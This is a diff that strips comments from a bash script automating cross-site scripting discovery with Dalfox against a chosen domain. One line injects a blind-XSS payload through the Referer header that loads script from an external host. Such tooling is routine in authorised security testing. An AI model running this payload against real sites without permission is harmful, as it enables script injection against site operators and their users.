@@ -65,7 +65,6 @@ missing_arg(){
     usage;
 }
 
-# Handling user arguments
 while [ -n "$1" ]; do
         case $1 in
                 -d|--domain)
@@ -92,17 +91,14 @@ while [ -n "$1" ]; do
         shift
 done
 
-# Creating Dir and fetch urls for a domain
 [[ $domain ]] && contruct_mode "$domain" || missing_arg "-d";
 
-# Check if Results Argument is present or not.
 if [ -z "$out" ]
 then
     out="results.txt"
     printf "No Output File selected, Results will be stored in $out\n"
 fi
 
-# STart XSS Hunting by checking if Blind XSS payload is present or not.
 if [ -z "$blind" ] ; then
     echo "XSS Automation Started using Dalfox.."
     dalfox file "$domain"_xss.txt -o "$out"
@@ -111,5 +107,4 @@ else
     dalfox file "$domain"_xss.txt -b "$blind" -o "$out" -H "referrer: xxx'><script src=//$blind></script>"
 fi
 
-# Final Result
 echo -e "XSS automation completed, Results stored in$blue results/$domain ${end}Directory"
